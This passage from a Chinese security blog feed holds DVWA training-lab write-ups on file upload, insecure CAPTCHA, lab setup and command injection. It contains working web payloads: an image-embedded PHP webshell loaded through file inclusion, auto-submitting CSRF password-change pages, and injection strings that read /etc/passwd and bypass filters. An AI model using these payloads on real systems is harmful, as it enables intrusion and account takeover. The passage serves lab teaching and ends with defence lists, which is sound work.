id="什么是文件头"><a href="#什么是文件头" class="headerlink" title="什么是文件头"></a>什么是文件头</h2><p>文件头是位于文件开头的一段承担一定任务的数据，一般都在开头的部分</p><p>文件头就是为了描述一个文件的一些重要的属性,文件头告诉了打开并处理该文件的程序这些属性</p><p>常见文件的文件头(16进制)：</p><ol><li><p><code>JPEG (jpg)</code>，文件头：<code>FFD8FF</code></p></li><li><p><code>PNG (png)</code>，文件头：<code>89504E47</code></p></li><li><p><code>GIF (gif)</code>，文件头：<code>47494638</code></p></li><li><p><code>HTML (html)</code>，文件头：<code>68746D6C3E</code></p></li><li><p><code>MS Word/Excel (xls.or.doc)</code>，文件头：<code>D0CF11E0</code></p></li><li><p><code>Quicken (qdf)</code>，文件头：<code>AC9EBD8F</code></p></li><li><p><code>ZIP Archive (zip)</code>，文件头：<code>504B0304</code></p></li><li><p><code>RAR Archive (rar)</code>，文件头：<code>52617221</code></p></li><li><p>可执行文件（<code>EXE</code>），文件头：<code>MZ</code></p></li></ol><!--## 截断绕过规则采用`%00`截断的方法可以轻松绕过文件名的检查，但是需要将上传文件的文件头伪装成图片--><h2 id="将木马隐藏在图片中绕过-文件上传-文件包含"><a href="#将木马隐藏在图片中绕过-文件上传-文件包含" class="headerlink" title="将木马隐藏在图片中绕过(文件上传+文件包含)"></a>将木马隐藏在图片中绕过(文件上传+文件包含)</h2><ol><li><p>使用<code>copy</code>将木马文件<code>a.php</code>与图片文件<code>1.jpg</code>合并</p><p> <img src="/images/baji/dvwa/file upload/12.png" alt="12.png"></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.jpg/b+a.php/a a.jpg</span><br></pre></td></tr></table></figure><p><img src="/images/baji/dvwa/file upload/13.png" alt="13.png"></p><p>可以看到，一句话木马被添加到图片的尾部</p><p><img src="/images/baji/dvwa/file upload/14.png" alt="14.png"></p></li><li><p>上传成功</p><p> <img src="/images/baji/dvwa/file upload/15.png" alt="15.png"></p></li><li><p>利用<code>high</code>级别文件包含漏洞读取图片马</p><p> <img src="/images/baji/dvwa/file upload/17.png" alt="17.png"></p></li><li><p>中国菜刀连接</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.12.83/vulnerabilities/fi/?page=file:///opt/lampp/htdocs/DVWA-master/hackable/uploads/a.jpg</span><br></pre></td></tr></table></figure><p>注意，应设置请求头中包含<code>cookie</code>值</p><p><img src="/images/baji/dvwa/file upload/18.png" alt="18.png"></p></li><li><p>连接成功</p><p> <img src="/images/baji/dvwa/file upload/19.png" alt="19.png"></p></li></ol><hr><h1 id="Impossible级别"><a href="#Impossible级别" class="headerlink" title="Impossible级别"></a>Impossible级别</h1><p><code>Impossible</code>级别的代码对上传文件进行了重命名（改为<code>md5</code>值），加入<code>Anti-CSRF token</code>防护<code>CSRF</code>攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件</p><hr><h1 id="文件上传防御"><a href="#文件上传防御" class="headerlink" title="文件上传防御"></a>文件上传防御</h1><ol><li><p>文件扩展名在服务器端使用白名单进行校验</p></li><li><p>文件内容在服务器端进行校验</p></li><li><p>对文件进行上传重命名</p></li><li><p>隐藏文件上传路径</p></li><li><p>文件上传目录权限为任何人不可执行</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
      <category term="DVWA1.10" scheme="http://yoursite.com/tags/DVWA1-10/"/>
    
  </entry>
  
  <entry>
    <title>DVWA1.10之不安全的验证码</title>
    <link href="http://yoursite.com/2019/05/23/DVWA1-10%E4%B9%8B%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81/"/>
    <id>http://yoursite.com/2019/05/23/DVWA1-10之不安全的验证码/</id>
    <published>2019-05-23T14:11:00.000Z</published>
    <updated>2020-02-24T04:17:42.177Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><code>Insecure CAPTCHA</code>，意思是不安全的验证码，<code>CAPTCHA</code>是“全自动区分计算机和人类的图灵测试”的简称</p><p><code>reCaptcha</code>是<code>Google</code>开发的验证码工具，是<code>Google</code>提供的使用最广泛的验证码服务，是一项免费服务，可以保护您的网站免受垃圾邮件和滥用。<code>reCAPTCHA</code>使用先进的风险分析引擎和自适应<code>CAPTCHA</code>来防止自动化软件在您的网站上进行滥用行为</p><h2 id="reCAPTCHA验证流程"><a href="#reCAPTCHA验证流程" class="headerlink" title="reCAPTCHA验证流程"></a>reCAPTCHA验证流程</h2><p><img src="/images/baji/dvwa/insecure captcha/1.png" alt="1.png"></p><p>网站服务器调用<code>recaptcha_check_answer</code>函数检查用户输入验证码的正确性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">recaptcha_check_answer($privkey,$response)</span><br></pre></td></tr></table></figure><ol><li><p><code>$privkey</code>是服务器申请的<code>private key</code>(私钥)</p></li><li><p><code>$response</code>：通过页面表单发送的<code>g-recaptcha-response</code>的值</p></li></ol><p><code>recaptcha_check_answer</code>函数返回<code>ReCaptchaResponse class</code>的实例，<code>ReCaptchaResponse</code>类有2个属性：</p><ol><li><p><code>$is_valid</code>是布尔型的，表示校验是否有效</p></li><li><p><code>$error</code>是返回的错误代码</p></li></ol><p><img src="/images/baji/dvwa/insecure captcha/2.png" alt="2.png"></p><p><strong>那这个模块的实验是不是需要科学上网呢？答案是不用，因为我们可以绕过验证码</strong></p><hr><h1 id="LOW级别"><a href="#LOW级别" class="headerlink" title="LOW级别"></a>LOW级别</h1><p>服务器将改密操作分成了两步：</p><ol><li><p>检查用户输入的验证码，验证通过后，服务器返回表单</p></li><li><p>客户端提交<code>post</code>请求，服务器完成更改密码的操作</p></li></ol><p>这其中存在明显的逻辑漏洞，服务器仅仅通过检查<code>Change</code>、<code>step</code>参数来判断用户是否已经输入了正确的验证码</p><p><img src="/images/baji/dvwa/insecure captcha/3.png" alt="3.png"></p><p>因未科学上网，验证码无法显示</p><h2 id="修改参数绕过"><a href="#修改参数绕过" class="headerlink" title="修改参数绕过"></a>修改参数绕过</h2><ol><li><p>抓包修改<code>step</code>参数</p><p> <img src="/images/baji/dvwa/insecure captcha/4.png" alt="4.png"></p><p> 因为没有翻墙，所以没能成功显示验证码，发送的请求包中也就没有<code>recaptcha_challenge_field</code>、<code>recaptcha_response_field</code>两个参数</p><p> 将<code>step</code>参数由1修改为2</p></li><li><p>密码修改成功</p><p> <img src="/images/baji/dvwa/insecure captcha/5.png" alt="5.png"></p></li></ol><h2 id="构造攻击页面"><a href="#构造攻击页面" class="headerlink" title="构造攻击页面"></a>构造攻击页面</h2><p>由于没有任何的防御<code>CSRF</code>机制，我们可以轻易地构造攻击页面</p><ol><li><p>编写攻击页面<code>xx.html</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;      </span><br><span class="line"></span><br><span class="line">&lt;body onload=&quot;document.getElementById(&apos;transfer&apos;).submit()&quot;&gt;        </span><br><span class="line"></span><br><span class="line"> &lt;div&gt;    </span><br><span class="line"></span><br><span class="line">   &lt;form method=&quot;POST&quot; id=&quot;transfer&quot; action=&quot;http://172.16.12.93/vulnerabilities/captcha/&quot;&gt;     </span><br><span class="line"></span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;password123&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;password123&quot;&gt;     </span><br><span class="line"></span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;step&quot; value=&quot;2&quot;&gt;  </span><br><span class="line"></span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt;        </span><br><span class="line"></span><br><span class="line">&lt;/form&gt;        </span><br><span class="line"></span><br><span class="line"> &lt;/div&gt;        </span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></li><li><p>将攻击页面放置到攻击者的公网服务器(此处为192.168.43.132)上</p></li><li><p>向被攻击者发送恶意链接</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.132/xx.html</span><br></pre></td></tr></table></figure></li><li><p>被攻击者在登陆<code>DVWA</code>的情况下点击恶意链接，则密码被修改成功</p><p> 美中不足的是，被攻击者看到更改密码成功的界面（这是因为修改密码成功后，服务器会返回302，实现自动跳转），从而意识到自己遭到了攻击</p><p> <img src="/images/baji/dvwa/insecure captcha/6.png" alt="6.png"></p></li></ol><hr><h1 id="Medium级别"><a href="#Medium级别" class="headerlink" title="Medium级别"></a>Medium级别</h1><p><code>Medium</code>级别的代码在第二步验证时，参加了对参数<code>passed_captcha</code>的检查，如果参数值为<code>true</code>，则认为用户已经通过了验证码检查，然而用户依然可以通过伪造参数绕过验证</p><h2 id="修改参数绕过-1"><a href="#修改参数绕过-1" class="headerlink" title="修改参数绕过"></a>修改参数绕过</h2><ol><li><p>抓包修改<code>step</code>参数，增加<code>passed_captcha</code>参数，绕过验证码</p><p> <img src="/images/baji/dvwa/insecure captcha/7.png" alt="7.png"></p></li><li><p>密码修改成功</p><p> <img src="/images/baji/dvwa/insecure captcha/8.png" alt="8.png"></p></li></ol><h2 id="构造攻击页面-1"><a href="#构造攻击页面-1" class="headerlink" title="构造攻击页面"></a>构造攻击页面</h2><p>依然可以进行<code>CSRF</code>攻击</p><ol><li><p>编写攻击页面<code>cc.html</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;      </span><br><span class="line"></span><br><span class="line">&lt;body onload=&quot;document.getElementById(&apos;transfer&apos;).submit()&quot;&gt;        </span><br><span class="line"></span><br><span class="line"> &lt;div&gt;    </span><br><span class="line"></span><br><span class="line">   &lt;form method=&quot;POST&quot; id=&quot;transfer&quot; action=&quot;http://172.16.12.93/vulnerabilities/captcha/&quot;&gt;     </span><br><span class="line"></span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;password123&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;password123&quot;&gt;</span><br><span class="line">           </span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;passed_captcha&quot; value=&quot;true&quot;&gt;</span><br><span class="line">           </span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;step&quot; value=&quot;2&quot;&gt;  </span><br><span class="line"></span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt;        </span><br><span class="line"></span><br><span class="line">&lt;/form&gt;        </span><br><span class="line"></span><br><span class="line"> &lt;/div&gt;        </span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></li><li><p>将攻击页面放置到攻击者的公网服务器(此处为192.168.43.132)上</p></li><li><p>向被攻击者发送恶意链接</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.132/cc.html</span><br></pre></td></tr></table></figure></li><li><p>被攻击者在登陆<code>DVWA</code>的情况下点击恶意链接，则密码被修改成功</p><p> 不过依然会跳转到更改密码成功的界面</p><p> <img src="/images/baji/dvwa/insecure captcha/6.png" alt="6.png"></p></li></ol><hr><h1 id="High级别"><a href="#High级别" class="headerlink" title="High级别"></a>High级别</h1><p>服务器的验证逻辑是当<code>$resp</code>（这里是指谷歌返回的验证结果）是<code>true</code>，或者参数<code>g-recaptcha-response</code>等于<code>hidd3n_valu3</code>并且<code>http</code>包头的<code>User-Agent</code>参数等于<code>reCAPTCHA</code>时，就认为验证码正确</p><p><code>$resp</code>参数不可控</p><ol><li><p>抓包修改参数</p><p> 修改<code>User-Agent</code>值为<code>reCAPTCHA</code></p><p> 添加<code>g-recaptcha-response</code>参数，值为<code>hidd3n_valu3</code></p><p> <img src="/images/baji/dvwa/insecure captcha/9.png" alt="9.png"></p></li><li><p>密码修改成功</p><p> <img src="/images/baji/dvwa/insecure captcha/6.png" alt="6.png"></p></li></ol><hr><h1 id="Impossible级别"><a href="#Impossible级别" class="headerlink" title="Impossible级别"></a>Impossible级别</h1><p><code>Impossible</code>级别的代码增加了<code>Anti-CSRF token</code> 机制防御<code>CSRF</code>攻击，利用<code>PDO</code>技术防护<code>sql</code>注入，验证过程终于不再分成两部分了，验证码无法绕过，同时要求用户输入之前的密码，进一步加强了身份认证</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
      <category term="DVWA1.10" scheme="http://yoursite.com/tags/DVWA1-10/"/>
    
  </entry>
  
  <entry>
    <title>低版本DVWA靶机</title>
    <link href="http://yoursite.com/2019/05/22/%E4%BD%8E%E7%89%88%E6%9C%ACDVWA%E9%9D%B6%E6%9C%BA-1/"/>
    <id>http://yoursite.com/2019/05/22/低版本DVWA靶机-1/</id>
    <published>2019-05-22T13:25:00.000Z</published>
    <updated>2020-02-24T04:18:04.091Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><blockquote><p>因高版本<code>xampp</code>中<code>php</code>版本过高，部分<code>dvwa</code>靶机环境无法使用，所以重新部署<code>DVWA</code>环境</p></blockquote><hr><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p><code>centos</code>7 32位</p><p><code>xampp</code>版本1.7.3</p><p><code>DVWA</code>版本1.10</p><hr><h1 id="xampp部署"><a href="#xampp部署" class="headerlink" title="xampp部署"></a>xampp部署</h1><ol><li><p>解压</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar xzvf xampp-linux-1.7.3.tar.gz -C /opt</span><br></pre></td></tr></table></figure></li><li><p>启动<code>xampp</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/lampp</span><br><span class="line">./lampp start</span><br></pre></td></tr></table></figure></li></ol><ol start="3"><li><p>禁用<code>xampp</code>的<code>ssl</code>功能</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/lampp</span><br><span class="line">./lampp stopssl</span><br></pre></td></tr></table></figure></li></ol><ol start="4"><li><p>配置<code>xampp</code>的安全选项</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./lampp security</span><br></pre></td></tr></table></figure><p><img src="/images/baji/low dvwa/1.png" alt="1.png"></p></li><li><p>重启<code>xampp</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./lampp restart</span><br></pre></td></tr></table></figure></li><li><p>开放防火墙80端口</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --zone=public --add-port=80/tcp --permanent</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure></li><li><p>访问即可</p><p> <img src="/images/baji/low dvwa/2.png" alt="2.png"></p></li></ol><hr><h1 id="DVWA部署"><a href="#DVWA部署" class="headerlink" title="DVWA部署"></a>DVWA部署</h1><ol><li><p>解压</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip DVWA-master.zip -d /opt/lampp/htdocs/</span><br></pre></td></tr></table></figure></li></ol><ol start="2"><li><p>更名</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/lampp/htdocs</span><br><span class="line">mv DVWA-master/ dvwa/</span><br></pre></td></tr></table></figure></li><li><p>更改网站根目录</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /opt/lampp/etc/httpd.conf</span><br></pre></td></tr></table></figure><p> 将<code>DocumentRoot &quot;/opt/lampp/htdocs&quot;</code>更改为<code>DocumentRoot &quot;/opt/lampp/htdocs/dvwa&quot;</code></p></li><li><p>设置<code>dvwa</code>配置文件</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/lampp/htdocs/DVWA-master/config</span><br><span class="line">cp config.inc.php.dist config.inc.php</span><br></pre></td></tr></table></figure></li><li><p>重启<code>lampp</code>服务即可访问</p><p> <img src="/images/baji/dvwa/3.png" alt="3.png"></p></li></ol><hr><h1 id="DVWA配置"><a href="#DVWA配置" class="headerlink" title="DVWA配置"></a>DVWA配置</h1><ol><li><p><code>PHP function allow_url_include: Disabled</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /opt/lampp/etc/php.ini</span><br></pre></td></tr></table></figure><p>将<code>allow_url_include=Off</code>改为<code>allow_url_include=On</code></p></li><li><p><code>reCAPTCHA key: Missing</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /opt/lampp/htdocs/dvwa/config/config.inc.php</span><br></pre></td></tr></table></figure><p>将</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_DVWA[ &apos;recaptcha_public_key&apos; ]  = &apos;&apos;;</span><br><span class="line">$_DVWA[ &apos;recaptcha_private_key&apos; ] = &apos;&apos;;</span><br></pre></td></tr></table></figure><p>改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_DVWA[ &apos;recaptcha_public_key&apos; ]  = &apos;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&apos;;</span><br><span class="line">$_DVWA[ &apos;recaptcha_private_key&apos; ] = &apos;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&apos;;</span><br></pre></td></tr></table></figure></li></ol><ol start="3"><li><p><code>Unable to connect to the database.</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /opt/lampp/htdocs/dvwa/config/config.inc.php</span><br></pre></td></tr></table></figure><p> 将<code>$_DVWA[ &#39;db_password&#39; ] = &#39;&#39;;</code>中的值改为自己<code>mysql</code>的<code>root</code>用户的密码</p></li><li><p>对目录无可写权限</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod 757 /opt/lampp/htdocs/dvwa/hackable/uploads/</span><br><span class="line">chmod 646 /opt/lampp/htdocs/dvwa/external/phpids/0.6/lib/IDS/tmp/phpids_log.txt</span><br><span class="line">chmod 757 /opt/lampp/htdocs/dvwa/config</span><br></pre></td></tr></table></figure></li></ol><ol start="5"><li><p>重启服务</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/lampp/</span><br><span class="line">./lampp restart</span><br></pre></td></tr></table></figure></li><li><p>刷新页面即可</p><p> <img src="/images/baji/dvwa/4.png" alt="4.png"></p></li><li><p>点击<code>Create/Reset Database</code>即可登陆使用</p></li></ol><hr><h1 id="添加开机自启"><a href="#添加开机自启" class="headerlink" title="添加开机自启"></a>添加开机自启</h1><ol><li><p>创建启动文件</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /lib/systemd/system/</span><br><span class="line">vi /lib/systemd/system/lampp.service</span><br></pre></td></tr></table></figure><p> 文件内容如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=lampp</span><br><span class="line">After=network.target</span><br><span class="line">      </span><br><span class="line">[Service]</span><br><span class="line">Type=forking</span><br><span class="line">ExecStart=/opt/lampp/lampp start</span><br><span class="line">ExecReload=/opt/lampp/lampp restart</span><br><span class="line">ExecStop=/opt/lampp/lampp  stop</span><br><span class="line">PrivateTmp=true </span><br><span class="line">      </span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure></li><li><p>设置启动文件权限</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 754 /lib/systemd/system/lampp.service</span><br></pre></td></tr></table></figure></li><li><p>设置开机自启</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable lampp.service</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
      <category term="DVWA1.10" scheme="http://yoursite.com/tags/DVWA1-10/"/>
    
  </entry>
  
  <entry>
    <title>DVWA1.10之命令注入</title>
    <link href="http://yoursite.com/2019/05/22/DVWA1-10%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2019/05/22/DVWA1-10之命令注入/</id>
    <published>2019-05-21T19:03:00.000Z</published>
    <updated>2020-02-24T04:18:30.719Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="命令注入简介"><a href="#命令注入简介" class="headerlink" title="命令注入简介"></a>命令注入简介</h1><p>命令注入，是指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的</p><hr><h1 id="LOW级别"><a href="#LOW级别" class="headerlink" title="LOW级别"></a>LOW级别</h1><p>服务器通过判断操作系统执行不同<code>ping</code>命令，但是对<code>ip</code>参数并未做任何的过滤，导致了严重的命令注入漏洞</p><p>正常执行</p><p><img src="/images/baji/dvwa/command injection/1.png" alt="1.png"></p><ol><li><p>使用<code>&amp;</code>同时执行多条命令</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 &amp; pwd</span><br></pre></td></tr></table></figure><p> <img src="/images/baji/dvwa/command injection/2.png" alt="2.png"></p></li><li><p>使用<code>|</code>(管道符)同时执行多条命令</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 | cat /etc/passwd</span><br></pre></td></tr></table></figure><p> <img src="/images/baji/dvwa/command injection/3.png" alt="3.png"></p></li><li><p>使用<code>&amp;&amp;</code>(与)同样可以执行多条命令</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 &amp;&amp; pwd</span><br></pre></td></tr></table></figure><p> <img src="/images/baji/dvwa/command injection/7.png" alt="7.png"></p></li><li><p>使用<code>||</code>(或)同样可以执行多条命令</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 || cat /etc/passwd</span><br></pre></td></tr></table></figure><p> <img src="/images/baji/dvwa/command injection/9.png" alt="9.png"></p></li><li><p>使用<code>;</code>同样可以执行多条命令</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 ; pwd</span><br></pre></td></tr></table></figure><p> <img src="/images/baji/dvwa/command injection/8.png" alt="8.png"></p></li><li><p>使用`、<code>$()</code>在有些情况下也可执行多条指令</p></li></ol><p><code>&amp;</code>与<code>&amp;&amp;</code>的区别：</p><ol><li><p><code>Command 1&amp;Command 2</code></p><p> 先执行<code>Command 1</code>，不管是否成功，都会执行<code>Command 2</code></p></li><li><p><code>Command 1&amp;&amp;Command 2</code></p><p> 先执行<code>Command 1</code>，执行成功后执行<code>Command 2</code>，否则不执行<code>Command 2</code></p></li></ol><p><code>|</code>与<code>||</code>的区别：</p><ol><li><p><code>Command 1|Command 2</code></p><p> 管道符，<code>Command 2</code>会以<code>Command 1</code>的输出结果为输入进行执行</p></li><li><p><code>Command 1||Command 2</code></p><p> 先执行<code>Command 1</code>失败，才会执行<code>Command 2</code></p></li></ol><hr><h1 id="Medium级别"><a href="#Medium级别" class="headerlink" title="Medium级别"></a>Medium级别</h1><p>服务器端对<code>ip</code>参数做了一定过滤，即把<code>&amp;&amp;</code> 、<code>;</code>删除，本质上采用的是黑名单机制，因此依旧存在安全问题</p><ol><li><p>使用<code>&amp;</code>绕过过滤</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 &amp; cat /etc/passwd</span><br></pre></td></tr></table></figure><p> <img src="/images/baji/dvwa/command injection/4.png" alt="4.png"></p></li><li><p>使用<code>&amp;;&amp;</code>绕过过滤</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 &amp;;&amp; pwd</span><br></pre></td></tr></table></figure><p> <img src="/images/baji/dvwa/command injection/5.png" alt="5.png"></p></li></ol><hr><h1 id="High级别"><a href="#High级别" class="headerlink" title="High级别"></a>High级别</h1><p><code>High</code>级别的代码进一步完善了黑名单，过滤了<code>&amp;</code>、<code>;</code>、<code>|</code>、<code>-</code>、<code>$</code>、<code>(</code>、<code>)</code>、<code>||</code>、` 但由于黑名单机制的局限性，我们依然可以绕过</p><p>黑名单看似过滤了所有的非法字符，但仔细观察到是把<code>|</code>（注意这里<code>|</code>后有一个空格）替换为空字符，于是 <code>|</code>（注意这里<code>|</code>前有一个空格）成了“漏网之鱼”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 |cat /etc/passwd</span><br></pre></td></tr></table></figure><p><img src="/images/baji/dvwa/command injection/6.png" alt="6.png"></p><hr><h1 id="Impossible级别"><a href="#Impossible级别" class="headerlink" title="Impossible级别"></a>Impossible级别</h1><p><code>Impossible</code>级别的代码加入了<code>Anti-CSRF token</code>，同时对参数<code>ip</code>进行了严格的限制，只有诸如“数字.数字.数字.数字”的输入才会被接收执行，因此不存在命令注入漏洞</p><hr><h1 id="命令注入防御"><a href="#命令注入防御" class="headerlink" title="命令注入防御"></a>命令注入防御</h1><ol><li><p>如特殊需要，尽量不要使用系统命令</p></li><li><p>对敏感字符进行白名单过滤</p></li><li><p>参数值使用引号包括</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
      <category term="DVWA1.10" scheme="http://yoursite.com/tags/DVWA1-10/"/>
    
  </entry>
  
  <entry>
    <title>DVWA1.10之暴力破解</title>
    <link href="http://yoursite.com/2019/05/22/DVWA1-10%E4%B9%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
    <id>http://yoursite.com/2019/05/22/DVWA1-10之暴力破解/</id>
    <published>2019-05-21T18:23:00.000Z</published>
    <updated>2020-02-24T04:18:45.207Z</updated>
    
